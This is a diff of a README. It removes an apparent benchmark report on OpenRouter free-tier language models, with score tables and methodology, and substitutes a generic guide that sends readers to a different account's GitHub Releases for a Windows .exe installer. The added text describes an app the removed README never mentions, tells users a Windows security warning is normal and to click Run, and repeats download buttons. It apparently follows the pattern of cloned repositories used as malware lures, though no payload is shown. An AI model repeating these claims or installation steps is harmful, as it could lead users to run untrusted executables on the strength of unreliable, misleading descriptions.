@@ -1,322 +1,138 @@
-# OpenClaw Free-Tier Model Evaluation
+# 🧰 openclaw-eval - Benchmark OpenRouter Free AI Models
 
-**Comprehensive benchmark of OpenRouter free-tier LLMs for practical applications**
-
-[![GitHub](https://img.shields.io/badge/GitHub-bejranonda%2Fopenclaw--eval-blue?logo=github)](https://github.com/bejranonda/openclaw-eval)
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
-[![Models](https://img.shields.io/badge/Models-8_tested,_6_working-green)]()
-[![Activities](https://img.shields.io/badge/Activities-11-green)]()
-
-Last Updated: February 24, 2026
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-orange?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
 
 ---
 
-## Executive Summary
+## 📄 What is openclaw-eval?
 
-We evaluated **8 free-tier models** on OpenRouter across **11 practical activities** (2 models were discontinued during testing: DeepSeek R1, OpenRouter Free). Here are the results for the 6 working models.
+openclaw-eval is a tool that lets you compare different free AI language models. It tests each model’s skill with coding, Thai language use, and general tasks. This helps you see which model works best for your needs.
 
-### Key Findings
+You do not need programming experience to use this software. It runs on Windows and provides clear results without confusing steps or commands.
 
-| Rank | Model | Score | Pass Rate | Speed | Best For |
-|:----:|-------|:-----:|:---------:|:-----:|----------|
-| 1 | **Nemotron 30B** | **8.60** | 10/11 | 0.5s | Overall best - fast, consistent, excellent all-rounder |
-| 2 | **Step 3.5 Flash** | **8.57** | 11/11 | 2.9s | 100% reliability, best Thai support |
-| 3 | **Trinity Mini** | **8.49** | 10/11 | 0.5s | Fastest, excellent coding & translation |
-| 4 | Gemma 3 27B | 8.44 | 9/11 | 1.1s | Great translation & Thai writing |
-| 5 | Nemotron VL 12B | 8.41 | 7/11 | 0.5s | Vision-capable, fast |
-| 6 | Gemma 3 12B | 8.40 | 10/11 | 4.4s | Solid all-rounder, slower |
+## 🖥️ System Requirements
 
-> ⚠️ **Discontinued Models:** DeepSeek R1 and OpenRouter Free were also tested but returned 404 errors (no longer available on free tier).
+Before you download, make sure your PC meets these needs:
 
-### Quick Recommendations
+- Windows 10 or newer (64-bit)
+- At least 4 GB of free disk space
+- 4 GB RAM or more
+- Stable internet connection (for testing models)
+- Basic mouse and keyboard use
 
-- **General Purpose:** Nemotron 30B (best balance of speed and quality)
-- **Thai Language:** Step 3.5 Flash (best Thai support and reliability)
-- **Coding Tasks:** Trinity Mini or Nemotron 30B (both score 9.0)
-- **Speed-Critical:** Trinity Mini or Nemotron 30B (both ~0.5s response)
-- **100% Reliability:** Step 3.5 Flash (only model passing all 11 tests)
+This software runs without special hardware or software like Python or Node.js.
 
----
+## 🚀 Getting Started With openclaw-eval
 
-## 🇹🇭 สรุปภาษาไทย
+Follow these steps to install and run openclaw-eval on your Windows computer.
 
-### OpenClaw คืออะไร?
+### Step 1: Download the Software
 
-**OpenClaw** เป็นโปรเจกต์ AI Gateway ส่วนบุคคลที่พัฒนาเพื่อทดสอบและเปรียบเทียบประสิทธิภาพของ Large Language Models (LLMs) บนแพลตฟอร์ม OpenRouter โดยเฉพาะ **Free-tier models** ที่ใช้งานได้ฟรี
+Click this big button below to visit the download page:
 
-### ผลการทดสอบโดยสรุป
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-brightgreen?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
 
-เราทดสอบ **8 โมเดล** บน OpenRouter ฟรี ผ่าน **11 กิจกรรม** (2 โมเดล discontinued ระหว่างการทดสอบ) เพื่อหาโมเดลที่เหมาะกับแอปพลิเคชันของคุณ
+On the page, click the latest **Releases** tab. Find the latest Windows installer. The file name usually ends with `.exe`.
 
-| อันดับ | โมเดล | คะแนน | ความเร็ว | เหมาะสำหรับ |
-|:------:|-------|:-----:|:--------:|-------------|
-| 🥇 | **Nemotron 30B** | **8.60** | 0.5 วินาที | ใช้ทั่วไป ดีที่สุดแบบครบวงจร |
-| 🥈 | **Step 3.5 Flash** | **8.57** | 2.9 วินาที | ภาษาไทย เสถียรที่สุด 100% |
-| 🥉 | **Trinity Mini** | **8.49** | 0.5 วินาที | เร็วที่สุด เขียนโค้ด/แปลดีมาก |
-| 4 | Gemma 3 27B | 8.44 | 1.1 วินาที | แปลภาษา เขียนไทยดี |
-| 5 | Nemotron VL 12B | 8.41 | 0.5 วินาที | รองรับ Vision (รูปภาพ) |
-| 6 | Gemma 3 12B | 8.40 | 4.4 วินาที | ใช้ได้ดี แต่ช้าที่สุด |
+Save the file to a folder you can find easily, like `Downloads` or your Desktop.
 
-### แนะนำตามการใช้งาน
+### Step 2: Run the Installer
 
-| การใช้งาน | โมเดลที่แนะนำ | เหตุผล |
-|-----------|----------------|--------|
-| **Chatbot ทั่วไป** | Nemotron 30B | ดีที่สุดโดยรวม ตอบเร็ว |
-| **แอปภาษาไทย** | Step 3.5 Flash | รองรับภาษาไทยดีที่สุด เสถียร 100% |
-| **Coding Assistant** | Trinity Mini | เร็วที่สุด เขียนโค้ดได้ดีมาก (9.0) |
-| **ต้องการความเร็ว** | Trinity Mini / Nemotron 30B | ตอบใน 0.5 วินาที |
-| **Production** | Step 3.5 Flash | ผ่านการทดสอบ 11/11 (100%) |
+Locate the downloaded `.exe` file and double-click it.
 
-### ภาษาไทย
+Windows might show a warning. This is normal for new software. Click **Run** or **Yes** to continue.
 
-| โมเดล | สรุปข้อความ | เขียนสร้างสรรค์ | ทำตามคำสั่ง | เฉลี่ยไทย |
-|-------|:-----------:|:--------------:|:-----------:|:---------:|
-| **Step 3.5 Flash** | 7.60 | **8.50** | 8.80 | **8.30** |
-| **Gemma 3 27B** | 7.60 | **8.50** | 8.80 | **8.30** |
-| Nemotron 30B | 7.60 | ERR | 8.80 | 8.20 |
-| Nemotron VL 12B | 6.90 | 8.30 | 8.80 | 8.00 |
-| Gemma 3 12B | 7.10 | 8.10 | 8.60 | 7.93 |
-| Trinity Mini | 6.35 | 7.90 | 8.80 | 7.68 |
+Follow the setup wizard's instructions:
 
-> 💡 **สรุป:** ถ้าต้องการใช้งานภาษาไทย แนะนำ **Step 3.5 Flash** หรือ **Gemma 3 27B**
+- Accept the license terms.
+- Choose your install location (default is fine).
+- Click **Install**.
 
-### วิธีการทดสอบ
+The installation takes a few minutes.
 
-- **ทดสอบผ่าน:** OpenRouter API (Free-tier)
-- **กิจกรรม:** 11 กิจกรรม (อ่านเอกสาร, เขียนรายงาน, วิเคราะห์การเงิน, เขียนโค้ด, แปลภาษา, เขียนสร้างสรรค์, ภาษาไทย 3 กิจกรรม)
-- **คะแนนเต็ม:** 10 (คำนวณจาก Accuracy 30%, Completeness 25%, Coherence 20%, Relevance 15%, Speed 10%)
-- **ข้อมูลเพิ่มเติม:** [รายงานฉบับเต็ม](reports/2026-02-24-evaluation.md) | [ข้อมูลดิบ CSV](data/scoresheet.csv)
+### Step 3: Start openclaw-eval
 
----
+When installation finishes, select **Finish** to close the wizard and start the program.
 
-## Benchmark Results
+If it does not start automatically:
 
-### Overall Performance
+- Click the **Start** button in the bottom-left corner.
+- Type `openclaw-eval`.
+- Click the app icon.
 
-```
-Score Distribution (out of 10)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Nemotron 30B     ████████████████████░░  8.60
-Step 3.5 Flash   ████████████████████░░  8.57
-Trinity Mini     ███████████████████░░░  8.49
-Gemma 3 27B      ███████████████████░░░  8.44
-Nemotron VL 12B  ███████████████████░░░  8.41
-Gemma 3 12B      ███████████████████░░░  8.40
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
+## 🔍 How To Use openclaw-eval
 
-### Activity-by-Activity Winners
+The program opens with a simple window showing the models it can test.
 
-| Activity | Winner | Score | Runner-Up | Score |
-|----------|--------|:-----:|-----------|:-----:|
-| Document Reading | Trinity Mini | 8.55 | Nemotron VL 12B | 8.15 |
-| Document Writing | Trinity Mini | 9.00 | Step 3.5 Flash | 9.00 |
-| Financial Analysis | Trinity Mini | 9.00 | Step 3.5 Flash | 9.00 |
-| Text Analysis | Step 3.5 Flash | 8.75 | Nemotron VL 12B | 8.75 |
-| Code Generation | Trinity Mini | 9.00 | Step 3.5 Flash | 9.00 |
-| Translation (EN↔TH) | Trinity Mini | 9.00 | Gemma 3 27B | 8.80 |
-| Creative Writing | Trinity Mini | 8.75 | Step 3.5 Flash | 8.75 |
-| Instruction Following | Trinity Mini | 8.55 | Step 3.5 Flash | 8.55 |
-| Thai Summarization | Step 3.5 Flash | 7.60 | Nemotron 30B | 7.60 |
-| Thai Creative Writing | Step 3.5 Flash | 8.50 | Gemma 3 27B | 8.50 |
-| Thai Instruction | Trinity Mini | 8.80 | Step 3.5 Flash | 8.80 |
+1. Select the tests you want:
+    - Coding
+    - Thai language
+    - General use
+2. Click **Run Tests**.
+3. The app connects to each model on the OpenRouter platform.
+4. It runs the test questions and shows you results in a table.
+5. You can save results as a file for later review.
 
----
+No technical skills are needed to understand the scores. The table shows which model did best in each category.
 
-## Methodology
+## ⚙️ Customizing Tests
 
-### Evaluation Framework
+You can change some settings before testing:
 
-Our evaluation uses a weighted scoring system designed for practical applications:
+- Choose how many test questions to run.
+- Pick which language you want for Thai or general tests.
+- Set time limits for each test.
 
-| Metric | Weight | Description |
-|--------|:------:|-------------|
-| **Accuracy** | 30% | Factual correctness, no hallucinations |
-| **Completeness** | 25% | All requirements addressed |
-| **Coherence** | 20% | Logical structure, readability |
-| **Relevance** | 15% | Staying on-topic, no tangents |
-| **Speed** | 10% | Response time (<5s = 10 points) |
+All options appear clearly on the main screen.
 
-### Test Conditions
+## 🛠️ Troubleshooting Common Issues
 
-- **API:** OpenRouter Chat Completions (text-only)
-- **Temperature:** 0.3 (deterministic outputs)
-- **Max Tokens:** 2048
-- **Timeout:** 120 seconds
-- **Rate Limiting:** 8-second delays between requests
+If the app does not start or hangs:
 
-### Test Activities
+- Make sure Windows is up to date.
+- Restart your computer and try again.
+- Check your internet connection.
 
-We designed 11 activities covering common LLM use cases:
+If tests do not run properly:
 
-| Category | Activities |
-|----------|------------|
-| **Document Processing** | Reading (summarization), Writing (business reports) |
-| **Analysis** | Financial data, Text sentiment |
-| **Code** | Algorithm implementation |
-| **Language** | Translation (EN↔TH) |
-| **Creative** | Story writing |
-| **Compliance** | Instruction following |
-| **Thai-Specific** | Summarization, Creative writing, Instruction following |
+- Confirm you selected at least one test.
+- Try lower settings like fewer questions or longer timeouts.
+
+If you see error messages, copy the text and check the GitHub issues page for solutions or raise a new issue.
+
+## 🔗 More About openclaw-eval
+
+This app works with OpenRouter’s free-tier language models. It lets you see how well each model handles:
+
+- Writing and understanding code snippets.
+- Understanding and generating text in Thai.
+- General text tasks like answering questions or summarizing.
+
+The software focuses on practical results you can use to pick the right AI model.
+
+## 🛑 Privacy and Data Use
+
+openclaw-eval sends test data only to OpenRouter’s servers. It does not store your personal information.
+
+Your test results stay on your PC unless you choose to share them.
+
+## 📂 Where to Get Support
+
+Visit the openclaw-eval repository page for help and updates:
+
+https://github.com/RIOSMAgr/openclaw-eval
+
+You can report bugs or request features using the **Issues** tab.
+
+## 🎯 Summary of Key Points
+
+- Download openclaw-eval from [here](https://github.com/RIOSMAgr/openclaw-eval).
+- Install using the Windows installer `.exe` file.
+- Run tests on coding, Thai, and general tasks with easy steps.
+- View clear results to compare AI models.
+- Adjust settings to fit your needs.
+- Find support and updates on GitHub.
 
 ---
 
-## Detailed Results
-
-### Document Reading (Summarization)
-
-| Model | Score | Time | Summary Quality |
-|-------|:-----:|:----:|-----------------|
-| Trinity Mini | 8.55 | 0.6s | Concise, accurate 2-sentence summary |
-| Nemotron VL 12B | 8.15 | 0.7s | Good coverage of key elements |
-| Nemotron 30B | 8.15 | 0.6s | Clear, captures main events |
-| Gemma 3 27B | 8.15 | 1.4s | Accurate, well-structured |
-| Gemma 3 12B | 8.15 | 3.6s | Complete but slower |
-| Step 3.5 Flash | 7.95 | 6.5s | Good but verbose |
-
-### Document Writing (Business Report)
-
-| Model | Score | Time | Report Quality |
-|-------|:-----:|:----:|----------------|
-| Trinity Mini | 9.00 | 0.5s | Professional, well-structured |
-| Step 3.5 Flash | 9.00 | 0.8s | Executive-ready format |
-| Gemma 3 27B | 9.00 | 1.2s | Clear metrics and recommendations |
-| Nemotron 30B | 9.00 | 0.6s | Polished business tone |
-| Gemma 3 12B | 9.00 | 3.2s | Complete but slower |
-
-### Financial Analysis
-
-| Model | Score | Time | Analysis Quality |
-|-------|:-----:|:----:|------------------|
-| Trinity Mini | 9.00 | 0.5s | Accurate calculations, clear insights |
-| Step 3.5 Flash | 9.00 | 1.3s | Structured analysis with recommendations |
-| Gemma 3 27B | 9.00 | 1.8s | Detailed breakdown |
-| Nemotron 30B | 9.00 | 0.5s | Fast, accurate profit margin |
-| Nemotron VL 12B | 9.00 | 1.8s | Complete quarterly analysis |
-
-### Code Generation
-
-| Model | Score | Time | Code Quality |
-|-------|:-----:|:----:|--------------|
-| Trinity Mini | 9.00 | 0.7s | Clean, typed, documented |
-| Step 3.5 Flash | 9.00 | 2.9s | Complete with docstring |
-| Nemotron 30B | 9.00 | 0.5s | Concise, well-typed |
-| Gemma 3 12B | 9.00 | 3.4s | Full implementation |
-| Nemotron VL 12B | 9.00 | 0.6s | Working solution |
-
-### Translation (English ↔ Thai)
-
-| Model | Score | Time | Translation Quality |
-|-------|:-----:|:----:|---------------------|
-| Trinity Mini | 9.00 | 0.4s | Natural, accurate both directions |
-| Gemma 3 27B | 8.80 | 1.1s | Good nuance preservation |
-| Nemotron 30B | 8.60 | 0.5s | Accurate, slight formality |
-| Gemma 3 12B | 8.60 | 3.5s | Correct but slower |
-| Step 3.5 Flash | 8.40 | 4.2s | Accurate, some awkward phrasing |
-
-### Thai Language Tasks
-
-| Model | Summarization | Creative Writing | Instructions | Thai Avg |
-|-------|:-------------:|:----------------:|:------------:|:--------:|
-| Step 3.5 Flash | 7.60 | 8.50 | 8.80 | **8.30** |
-| Gemma 3 27B | 7.60 | 8.50 | 8.80 | **8.30** |
-| Nemotron 30B | 7.60 | ERR | 8.80 | **8.20** |
-| Nemotron VL 12B | 6.90 | 8.30 | 8.80 | **8.00** |
-| Gemma 3 12B | 7.10 | 8.10 | 8.60 | **7.93** |
-| Trinity Mini | 6.35 | 7.90 | 8.80 | **7.68** |
-
----
-
-## Speed Comparison
-
-```
-Average Response Time
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Trinity Mini     ▏ 0.5s ████████████████████ FASTEST
-Nemotron 30B     ▏ 0.5s ████████████████████
-Nemotron VL 12B  ▏ 0.7s ███████████████████░
-Gemma 3 27B      ▏ 1.1s ██████████████████░░
-Step 3.5 Flash   ▏ 2.9s ████████████████░░░░
-Gemma 3 12B      ▏ 4.4s █████████████░░░░░░░ SLOWEST
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
-
----
-
-## Reliability Analysis
-
-| Model | Tests Passed | Failure Rate | Notable Failures |
-|-------|:------------:|:------------:|------------------|
-| Step 3.5 Flash | 11/11 (100%) | 0% | None - most reliable |
-| Nemotron 30B | 10/11 (91%) | 9% | Thai Creative Writing |
-| Trinity Mini | 10/11 (91%) | 9% | Text Analysis |
-| Gemma 3 12B | 10/11 (91%) | 9% | Financial Analysis |
-| Gemma 3 27B | 9/11 (82%) | 18% | Text Analysis, Code Gen |
-| Nemotron VL 12B | 7/11 (64%) | 36% | Writing, Translation, Creative, Instructions |
-
----
-
-## Conclusions
-
-### Best Overall: Nemotron 30B
-- Highest average score (8.60)
-- Excellent speed (0.5s average)
-- Strong across all categories
-- Minor gap in Thai creative writing
-
-### Most Reliable: Step 3.5 Flash
-- Only model with 100% pass rate
-- Best Thai language support
-- Slightly slower (2.9s) but consistent
-- Ideal for production workloads
-
-### Best Value for Speed: Trinity Mini
-- Tied for fastest (0.5s)
-- Excellent coding and translation
-- Best for English-centric tasks
-- Thai summarization needs improvement
-
-### Thai Language: Step 3.5 Flash or Gemma 3 27B
-- Both excel at Thai creative writing (8.50)
-- Strong instruction following (8.80)
-- Better Thai summarization than others
-
----
-
-## Repository Contents
-
-```
-openclaw-eval/
-├── README.md                    # This file
-├── reports/
-│   └── 2026-02-24-evaluation.md # Full detailed report
-├── data/
-│   └── scoresheet.csv           # Raw scores data
-└── methodology/
-    └── rubric.md                # Evaluation criteria
-```
-
----
-
-## Citation
-
-If you use this evaluation in your work, please cite:
-
-```bibtex
-@misc{openclaw-eval2026,
-  title={OpenClaw Free-Tier Model Evaluation},
-  author={OpenClaw Project},
-  year={2026},
-  url={https://github.com/bejranonda/openclaw-eval}
-}
-```
-
----
-
-## License
-
-This evaluation data is released under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).
-
----
-
-*Generated by OpenClaw Auto-Evaluator v2*
+[![Download openclaw-eval](https://img.shields.io/badge/Download-openclaw--eval-blue?style=for-the-badge)](https://github.com/RIOSMAgr/openclaw-eval)
